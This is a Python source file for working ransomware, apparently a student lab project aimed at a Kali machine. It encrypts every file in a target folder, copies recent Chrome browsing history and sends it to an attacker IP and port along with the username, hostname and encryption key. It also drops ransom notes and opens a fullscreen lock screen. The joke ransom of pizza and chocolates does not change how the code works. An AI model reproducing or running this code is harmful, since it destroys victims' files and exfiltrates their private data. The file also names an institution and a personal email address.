import os
import socket
import tkinter as tk
import sqlite3
import shutil
import tempfile
from pathlib import Path
from cryptography.fernet import Fernet

# Generate encryption key
key = Fernet.generate_key()
fernet = Fernet(key)

# Attacker IP (Kali machine)
ATTACKER_IP = "192.168.56.130"  # Replace with Kali IP
ATTACKER_PORT = 4444

# Target folders (user data only)
USER_DIR = str(Path.home())
TARGET_DIRS = [
    os.path.join(USER_DIR, "Documents", "abcd")
]

# Extract recent Chrome history
def get_chrome_history():
    try:
        chrome_path = os.path.join(USER_DIR, r"AppData/Local/Google/Chrome/User Data/Default/History")
        tmp_db = tempfile.mktemp()
        shutil.copy2(chrome_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        rows = cursor.fetchall()

        conn.close()
        os.remove(tmp_db)

        history_text = "\nRecent Chrome History:\n"
        for url, title in rows:
            history_text += f"Title: {title}\nURL: {url}\n\n"
        return history_text
    except Exception as e:
        return f"Error retrieving history: {str(e)}"

# Send victim info + history to Kali
def send_victim_info():
    try:
        sock = socket.socket()
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        username = os.getlogin()
        hostname = socket.gethostname()
        history = get_chrome_history()

        message = (
            f"🚨 NEW VICTIM REPORT 🚨\n"
            f"Username: {username}\n"
            f"Hostname: {hostname}\n"
            f"Encryption Key: {key.decode()}\n"
            f"{history}"
        )
        sock.send(message.encode())
        sock.close()
    except Exception as e:
        pass  # Silent fail to avoid crashing

# Encrypt files in target folders
def encrypt_user_files():
    for dir_path in TARGET_DIRS:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, "rb") as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(filepath, "wb") as f:
                        f.write(encrypted)
                except:
                    pass

# Drop ransom note in each folder
def drop_ransom_notes():
    note = (
        "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
        "To recover them, buy us 1 large pizza and 3 chocolates.\n"
        "Deliver them to: Fatima Jinnah Women University, Rawalpindi.\n\n"
        "Then email the payment proof to: ayesha.faiza.aaiza@gmail.com"
    )
    for dir_path in TARGET_DIRS:
        try:
            with open(os.path.join(dir_path, "READ_ME.txt"), "w") as f:
                f.write(note)
        except:
            pass

# Lock the screen with fullscreen message
def show_ransom_screen():
    root = tk.Tk()
    root.title("YOUR FILES HAVE BEEN LOCKED")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    tk.Label(root, text="⚠ YOUR FILES ARE ENCRYPTED ⚠", fg="red", bg="black", font=("Arial", 30)).pack(pady=100)
    tk.Label(root, text=(
        "All your documents, images, and other files have been encrypted.\n"
        "To recover your files, follow the instructions in the ransom note.\n\n"
        "Shutting down your PC may result in permanent data loss."
    ), fg="white", bg="black", font=("Arial", 16)).pack()

    root.mainloop()

# Execute simulation
send_victim_info()
encrypt_user_files()
drop_ransom_notes()
show_ransom_screen()
